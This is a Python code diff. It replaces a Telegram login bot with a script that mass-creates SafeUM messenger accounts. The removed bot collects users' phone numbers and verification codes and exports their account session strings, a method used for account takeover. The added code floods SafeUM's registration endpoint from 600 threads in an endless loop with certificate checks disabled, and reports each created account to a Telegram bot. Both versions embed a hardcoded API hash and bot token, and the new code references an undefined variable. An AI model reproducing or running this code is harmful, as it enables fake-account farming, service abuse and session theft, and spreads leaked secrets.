@@ -1,68 +1,82 @@
-import logging
-import phonenumbers
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
-from pyrogram import Client, filters
+import websocket
+import ssl
+import os
+import json
+import gzip
+import requests
+from time import sleep
+import random
+import concurrent.futures
 
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-logger = logging.getLogger(__name__)
+created = 0
+failed = 0
 
-API_ID = '28803961'
-API_HASH = '4040917ceee8cf48c0ea217fcdc84250'
-TOKEN = '6529257547:AAG2MGxNXMLGxQtyUtA2zWEylP9QD5m-hGE'
+G = '\033[1;32m'
+L = '\033[1;31m'
 
-users_data = {}
+own_id = 7013440973
+tele_bot = '6529257547:AAG2MGxNXMLGxQtyUtA2zWEylP9QD5m-hGE'
+ch = 'qwertyuiopasdfghjklzxcvbnm1234567890.-'
 
-def start(update: Update, context: CallbackContext) -> None:
-    update.message.reply_text("👋 مرحباً! الرجاء إدخال رقم التليجرام الخاص بك مع رمز الدولة (مثال: +201234567890):")
 
-def handle_number(update: Update, context: CallbackContext) -> None:
-    user_id = update.message.from_user.id
-    user_number = update.message.text
+def create():
+    global created
+    global failed
+    user = str(random.choice('qwertyuioplkjhgfdsazxcvbnm')[0]) + str(''.join(random.choice(ch) for i in range(8)))
 
-    try:
-        phone_number = phonenumbers.parse(user_number)
-        if phonenumbers.is_valid_number(phone_number):
-            users_data[user_id] = {'phone_number': user_number}
-            update.message.reply_text("✅ تم استقبال الرقم. الرجاء إدخال رمز التحقق الذي تلقيته:")
+    headers = {
+        "app": "com.safeum.android",
+        "host": None,
+        "remoteIp": "195.13.182.217",
+        "remotePort": str(8080),
+        "sessionId": "b6cbb22d-06ca-41ff-8fda-c0ddeb148195",
+        "time": "2023-04-30 12:13:32",
+        "url": "wss://195.13.182.217/Auth"
+    }
 
-            # Request verification code directly after receiving the number
-            handle_code(update, context)
-        else:
-            update.message.reply_text("❌ الرقم غير صحيح. الرجاء إدخال رقم صحيح:")
-    except phonenumbers.phonenumberutil.NumberParseException:
-        update.message.reply_text("❌ الرقم غير صحيح. الرجاء إدخال رقم صحيح:")
+    data0 = {"action": "Register", "subaction": "Desktop", "locale": "en_GB", "gmt": "+02",
+             "password": {"m1x": "503c73d12b354f86ff9706b2114704380876f59f1444133e62ca27b5ee8127cc",
+                          "m1y": "6387ae32b7087257452ae27fc8a925ddd6ba31d955639838249c02b3de175dfc",
+                          "m2": "219d1d9b049550f26a6c7b7914a44da1b5c931eff8692dbfe3127eeb1a922fcf",
+                          "iv": "e38cb9e83aef6ceb60a7a71493317903",
+                          "message": "0d99759f972c527722a18a74b3e0b3c6060fe1be3ad53581a7692ff67b7bb651a18cde40552972d6d0b1482e119abde6203f5ab4985940da19bb998bb73f523806ed67cc6c9dbd310fd59fedee420f32"},
+             "magicword": {"m1x": "04eb364e4ef79f31f3e95df2a956e9c72ddc7b8ed4bf965f4cea42739dbe8a4a",
+                           "m1y": "ef1608faa151cb7989b0ba7f57b39822d7b282511a77c4d7a33afe8165bdc1ab",
+                           "m2": "4b4d1468bfaf01a82c574ea71c44052d3ecb7c2866a2ced102d0a1a55901c94b",
+                           "iv": "b31d0165dde6b3d204263d6ea4b96789",
+                           "message": "8c6ec7ce0b9108d882bb076be6e49fe2"},
+             "magicwordhint": "0000"
+             , "login": str(user), "devicename": "Xiaomi Redmi Note 8 Pro",
+             "softwareversion": "1.1.0.1380", "nickname": "hvtctchnjvfxfx"
+             , "os": "AND"
+             , "deviceuid": "c72d110c1ae40d50",
+             "devicepushuid": "*dxT6B6Solm0:APA91bHqL8wxzlyKHckKxMDz66HmUqmxCPAVKBDrs8KcxCAjwdpxIPTCfRmeEw8Jks_q13vOSFsOVjCVhb-CkkKmTUsaiS7YOYHQS_pbH1g6P4N-jlnRzySQwGvqMP1gxRVksHiOXKKP",
+             "osversion": "and_11.0.0", "id": "1734805704"}
 
-def handle_code(update: Update, context: CallbackContext) -> None:
-    user_id = update.message.from_user.id
-    user_code = update.message.text
+    ws = websocket.create_connection("wss://195.13.182.217/Auth", header=headers,
+                                     sslopt={"cert_reqs": ssl.CERT_NONE})
+    ws.send(json.dumps(data0))
+    result = ws.recv()
+    decoded_data = gzip.decompress(result)
+    decoded_str = decoded_data.decode('utf-8')
 
-    if user_id in users_data:
-        users_data[user_id]['verification_code'] = user_code
-        update.message.reply_text("🔄 جاري التحقق من الرمز...")
-
-        phone_number = users_data[user_id]['phone_number']
-        with Client("my_account", api_id=API_ID, api_hash=API_HASH) as app:
-            try:
-                app.start(phone=phone_number, code=user_code)
-
-                session_string = app.export_session_string()
-                update.message.reply_text(f"✅ تم تسجيل الدخول بنجاح. الجلسة:\n\n`{session_string}`\n\nقم بنسخها واستخدامها في تطبيقك.", parse_mode='Markdown')
-            except Exception as e:
-                update.message.reply_text(f"❌ حدث خطأ أثناء تسجيل الدخول: {str(e)}")
+    if '"comment":"Exists"' in decoded_str:
+        failed += 1
+    elif '"status":"Success"' in decoded_str:
+        created += 1
+        phone_number = f"Phone number= {actual_phone_number}"  # Replace {actual_phone_number} with the actual phone number used in account creation
+        message = f"New user created: `{user}`\n{phone_number}"
+        requests.post(f'https://api.telegram.org/bot{tele_bot}/sendmessage?chat_id={own_id}&text={message}&parse_mode=markdown')
+    elif '"comment":"Retry"' in decoded_str:
+        failed += 1
     else:
-        update.message.reply_text("❌ لم يتم استقبال رقم الهاتف. الرجاء إرسال رقم الهاتف أولاً.")
+        print(decoded_str)
 
-def main() -> None:
-    updater = Updater(TOKEN)
-    dp = updater.dispatcher
 
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_number))
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_code))
+executor = concurrent.futures.ThreadPoolExecutor(max_workers=600)
 
-    updater.start_polling()
-    updater.idle()
-
-if __name__ == '__main__':
-    main()
+while True:
+    executor.submit(create)
+    os.system('clear')
+    print(G + 'Created : ' + str(created))
+    print(L + 'Failed : ' + str(failed))
